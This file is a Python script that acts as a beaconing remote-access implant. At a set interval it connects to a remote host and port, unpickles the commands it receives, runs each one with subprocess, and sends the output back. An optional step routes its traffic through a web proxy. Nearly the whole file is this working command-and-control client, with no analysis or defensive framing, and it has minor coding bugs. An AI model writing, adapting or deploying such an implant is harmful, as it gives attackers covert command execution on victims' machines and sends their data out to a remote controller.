#!python3


# Standard libraries only
import sys
import socket
import subprocess
import time
import pickle
import os


 # Display script usage if not given correct number of arguments.
if len(sys.argv) != 4:
    print("usage:", sys.argv[0], "<rhost> <rport> <beacon_interval_seconds>")
    sys.exit(1)


# Initialize global variables.
rhost, rport, wait = sys.argv[1:4]
wait = int(wait)
rserver = (rhost, int(rport))


def phone_home():
# Core function, Call, get, run, send.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home...")
    else:
        try:
            data = s.recv(1024)
        except ConnectionResetError or EOFError:
            print("Dad hung up on me...")
        else:
            cmd = pickle.loads(data)
            if cmd == "refused" or None:
                s.close()
                s.shutdown
                s = None
                print("Dad isn't speaking with me...")
                return
            else:
                for c in cmd[1:]:
                    cmdarg = (c).split(" ")
                    try:
                        execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    except:
                        FileNotFoundError
                    else:
                        jar = pickle.dumps(execute.stdout)
                        s.sendall(jar)

            print("Told dad all about", cmd, "!")
    s.close()
    s.shutdown
    s = None
    return


while True:
# Ask for proxy information, and configure if needed.
    prox_ask = input("Would you like to push traffic through a web proxy (y/n)?: ")
    if prox_ask.lower() in ['y', 'yes']:
        prox_prot = input("What is the protocol (http/https)?: ")
        prox_user = input("What is the username?, if none hit enter: ")
        prox_pass = input("What is the password?, if none hit enter: ")
        prox_url = input("What is the proxy address/URL?: ")
        prox_port = input("What is the proxy port?: ")
        proxy = prox_prot+'//'+prox_user+':'+prox_pass+'@'+prox_url+':'+prox_port
        print("\n", proxy)
        prox_conf = input("Does the above look correct (y/n)?: ")
        if prox_conf.lower() in ['y', 'yes']:
            os.environ['http_proxy'] = proxy 
            os.environ['HTTP_PROXY'] = proxy
            os.environ['https_proxy'] = proxy
            os.environ['HTTPS_PROXY'] = proxy
            print('Proxy environment set')
            break
        else:
            print("Let's try again.")
    elif prox_ask.lower() in ['n', 'no']:
        print('skipping proxy set up')
        break
    else:
        print("Try again...")


while True:
# Run the function forever.
    phone_home()
    time.sleep(wait)